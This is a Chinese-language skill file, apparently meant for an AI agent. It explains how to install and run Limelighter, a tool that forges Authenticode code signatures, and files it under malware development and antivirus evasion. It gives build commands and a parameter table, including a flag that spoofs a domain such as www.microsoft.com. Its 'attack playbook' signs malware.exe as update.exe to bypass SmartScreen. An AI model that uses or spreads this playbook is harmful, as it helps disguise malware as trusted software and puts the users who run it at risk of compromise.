---
name: limelighter-forge
description: 渗透工具 skill:Limelighter 的安装、参数速查与攻击场景 playbook。当任务涉及 恶意软件开发与免杀 需要调用 Limelighter 时使用。
---

# Limelighter

- 攻击大类:C45 恶意软件开发与免杀
- 上游仓库:https://github.com/Tylous/Limelighter
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Tylous/Limelighter && cd Limelighter && go build
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./Limelighter -I payload.exe -O signed.exe` | 伪造签名 |
| `-I bin -O out -Domain www.microsoft.com` | 域名 |
| `-Sleep 5` | 延时 |

## 攻击场景 Playbook

### 伪造代码签名

```bash
./Limelighter -I malware.exe -O update.exe
# 可信签名绕过 SmartScreen
```

## 注意事项

Tylous 出品,伪造 Authenticode 签名。
